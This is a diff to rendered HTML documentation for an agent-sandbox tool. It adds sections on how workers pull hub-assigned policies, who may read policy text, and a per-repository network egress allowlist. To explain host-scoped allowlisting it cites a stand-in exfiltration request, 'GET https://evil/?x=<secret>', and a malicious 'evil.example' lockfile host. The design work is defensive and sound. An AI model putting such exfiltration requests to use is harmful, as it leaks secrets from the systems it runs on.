@@ -1655,6 +1655,73 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#policy-delivery-the-hub-assignment-reaches-the-worker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Policy delivery: the hub assignment reaches the worker
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Policy delivery: the hub assignment reaches the worker">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#who-can-read-a-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Who can read a policy
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#per-repo-egress-adr-0009-2a" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Per-repo egress (ADR 0009 §2a)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Per-repo egress (ADR 0009 §2a)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#two-trust-tiers-because-derivation-is-untrusted" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Two trust tiers, because derivation is untrusted
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#operating-it" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Operating it
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#verify-requires-docker-enginemoby-openshell-installed" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -1896,6 +1963,73 @@
     <span class="md-ellipsis">
       
         Environment knobs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#policy-delivery-the-hub-assignment-reaches-the-worker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Policy delivery: the hub assignment reaches the worker
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Policy delivery: the hub assignment reaches the worker">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#who-can-read-a-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Who can read a policy
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#per-repo-egress-adr-0009-2a" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Per-repo egress (ADR 0009 §2a)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Per-repo egress (ADR 0009 §2a)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#two-trust-tiers-because-derivation-is-untrusted" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Two trust tiers, because derivation is untrusted
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#operating-it" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Operating it
       
     </span>
   </a>
@@ -2240,8 +2374,144 @@ truthful.</p>
 <td>hub+gateway vars</td>
 <td>comma list of env names forwarded through the private sandbox environment file</td>
 </tr>
+<tr>
+<td><code>MAC_OPENSHELL_TASK_EGRESS</code></td>
+<td><em>(off)</em></td>
+<td>render per-repo egress into each task's policy (ADR 0009 §2a; see below)</td>
+</tr>
+<tr>
+<td><code>MAC_OPENSHELL_POLICY_SYNC</code></td>
+<td><code>1</code></td>
+<td>worker pulls its hub-assigned policy between tasks (see below)</td>
+</tr>
 </tbody>
 </table>
+<h2 id="policy-delivery-the-hub-assignment-reaches-the-worker">Policy delivery: the hub assignment reaches the worker<a class="headerlink" href="#policy-delivery-the-hub-assignment-reaches-the-worker" title="Permanent link">&para;</a></h2>
+<p><code>mac openshell policy assign &lt;policy&gt; &lt;agent&gt;</code> used to record intent only. The
+executor resolved its policy from <code>MAC_OPENSHELL_POLICY</code>,
+<code>~/.mac/openshell-policy.yaml</code>, or the bundled fail-closed default — and
+<code>~/.mac/openshell-policy.yaml</code> was written once at provision time by
+<code>bootstrap-openshell.sh</code>. A reassignment therefore reached a running worker only
+via a re-bootstrap.</p>
+<p>The worker now converges on its assignment. Between tasks (never mid-task — the
+executor reads the policy when it creates a sandbox) it pulls
+<code>GET /agents/{id}/openshell/policy</code>, and if the checksum differs from what is on
+disk it installs the text at <code>~/.mac/openshell-policy.yaml</code> via write-then-rename
+at mode <code>0600</code>, then reports convergence so <code>mac openshell policy deploy-status</code>
+reflects the host rather than the intent.</p>
+<p>Deliberate properties:</p>
+<ul>
+<li><strong>Self-only.</strong> The route carries the <code>agent</code> scope, not the generic <code>read</code> a
+  GET would otherwise get, and binds the path agent to the token principal — the
+  same treatment as <code>/agents/{id}/directives/effective</code>. A policy names the
+  fleet's hub/gateway hosts and the binaries allowed to reach them.</li>
+<li><strong><code>MAC_OPENSHELL_POLICY</code> still wins.</strong> An explicit operator override is never
+  overwritten; silently replacing the file it points at would make the override a
+  lie.</li>
+<li><strong>Fail-safe, not fail-open.</strong> An unreachable hub, a missing assignment, or a
+  malformed response leaves the existing policy in place. Confinement is never
+  dropped because delivery failed.</li>
+</ul>
+<h3 id="who-can-read-a-policy">Who can read a policy<a class="headerlink" href="#who-can-read-a-policy" title="Permanent link">&para;</a></h3>
+<p>The guardrail text names the fleet's hub and gateway hosts, their ports, and the
+binaries permitted to reach them — a map of the control plane. Every <em>write</em> on a
+policy already required the global fleet principal, so <code>policy_text</code> is privileged
+on the read side to match:</p>
+<table>
+<thead>
+<tr>
+<th>Surface</th>
+<th>Scope</th>
+<th>Carries <code>policy_text</code>?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>GET /openshell/policies/{id}</code>, <code>.../versions</code>, <code>POST .../render</code></td>
+<td><code>admin</code></td>
+<td>yes</td>
+</tr>
+<tr>
+<td><code>GET /agents/{id}/openshell/policy</code></td>
+<td><code>agent</code>, self-only</td>
+<td>yes (its own)</td>
+</tr>
+<tr>
+<td><code>GET /openshell/policies</code>, <code>.../assignments</code>, <code>/agents/{id}/openshell/status</code>, <code>/dashboard/state</code></td>
+<td><code>read</code></td>
+<td><strong>no</strong> — identity, version and checksum only</td>
+</tr>
+</tbody>
+</table>
+<p><code>OpenShellPolicy.to_dict()</code> and <code>OpenShellPolicyVersion.to_dict()</code> omit the text
+<strong>by default</strong>; callers needing it pass <code>include_text=True</code>. The default is the
+control, not per-route filtering: every route that serialized a policy leaked the
+body by accident — <code>/dashboard/state</code>, which embeds the whole corpus, included —
+and a new route would have inherited the same leak. <code>render</code> is admin-gated too,
+because a rendered policy is the template with the placeholders filled <em>in</em>.</p>
+<p><code>checksum</code> is retained everywhere, so drift detection and the worker's
+skip-if-converged check never need the body.</p>
+<h2 id="per-repo-egress-adr-0009-2a">Per-repo egress (ADR 0009 §2a)<a class="headerlink" href="#per-repo-egress-adr-0009-2a" title="Permanent link">&para;</a></h2>
+<p>Deny-by-default egress is right for an unknown repo, but a real repository has to
+reach its package registry. Before this landed the only way to allow that was to
+declare the hosts <strong>fleet-wide</strong> in the operator template, so every sandbox in
+the fleet carried the union of every repo's egress.</p>
+<p>With <code>MAC_OPENSHELL_TASK_EGRESS=1</code>, the executor widens <em>that task's</em> policy from
+the environment contract the worker derived for the repository, and only that
+task's. The base policy is <strong>appended to, never rewritten</strong>, so expansion cannot
+relax a filesystem rule, the Landlock posture, or <code>run_as_user</code>.</p>
+<h3 id="two-trust-tiers-because-derivation-is-untrusted">Two trust tiers, because derivation is untrusted<a class="headerlink" href="#two-trust-tiers-because-derivation-is-untrusted" title="Permanent link">&para;</a></h3>
+<p><code>derive_environment_contract</code> reads <code>.npmrc</code> and lockfile resolution URLs from
+the repository <strong>working tree</strong>, which anyone who can open a pull request
+controls. Derivation is therefore a <em>proposal</em>, never a grant
+(<code>src/mac/sandbox_egress.py</code>):</p>
+<table>
+<thead>
+<tr>
+<th>Tier</th>
+<th>Source</th>
+<th>Granted when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>derived_trusted_registry</code></td>
+<td>repo working tree</td>
+<td>the host exactly matches the reviewed <code>TRUSTED_REGISTRY_HOSTS</code> allowlist</td>
+</tr>
+<tr>
+<td><code>hub_declared</code></td>
+<td>task <code>metadata.egress_contract.hosts</code></td>
+<td>the host is well-formed</td>
+</tr>
+</tbody>
+</table>
+<p>A lockfile naming <code>evil.example</code> is refused and reported as a contract gap, not
+granted. The declared tier reads <strong>top-level</strong> task metadata on purpose:
+<code>metadata.runtime</code> is worker-written and so carries only repo trust, whereas
+top-level task metadata was set through an authenticated hub credential.</p>
+<p>Every grant is <code>access: read-only</code> and host-scoped — host-allowlisting is the
+axis, because <code>GET https://evil/?x=&lt;secret&gt;</code> is exfiltration with a GET.</p>
+<h3 id="operating-it">Operating it<a class="headerlink" href="#operating-it" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Off by default: a repo must not be able to widen its own sandbox by adding a
+  lockfile entry, so enabling this is an operator act.</li>
+<li>Every decision emits a <code>sandbox_egress_decision</code> telemetry event carrying
+  grants <strong>and</strong> refusals. A denied fetch is otherwise diagnosed as a flaky
+  network several runs later.</li>
+<li>Read-only repository reports never expand: they attest the <code>policy_sha256</code>
+  they ran under, and a per-task policy would invalidate that attestation.</li>
+<li>A fleet with a private registry overrides the allowlist rather than
+  weakening it: pass <code>trusted_registries</code> to <code>classify_egress_hosts</code>.</li>
+<li>The <strong>bundled fail-closed default is never expanded.</strong> It ends
+  <code>network_policies: {}</code>, and widening it would turn "unconfigured deployment
+  fails closed" into "unconfigured deployment has egress". Expansion requires a
+  base policy that already declares a non-empty <code>network_policies</code> block — i.e.
+  a real operator policy.</li>
+<li>If rendering fails for any reason the task runs on the base policy, so it
+  fails the way it did before the feature existed (a denied fetch) rather than
+  failing open or losing the run.</li>
+</ul>
 <h2 id="verify-requires-docker-enginemoby-openshell-installed">Verify (requires Docker Engine/Moby + OpenShell installed)<a class="headerlink" href="#verify-requires-docker-enginemoby-openshell-installed" title="Permanent link">&para;</a></h2>
 <ol>
 <li><code>docker info</code> succeeds and <code>docker --version</code> is not a Podman compatibility
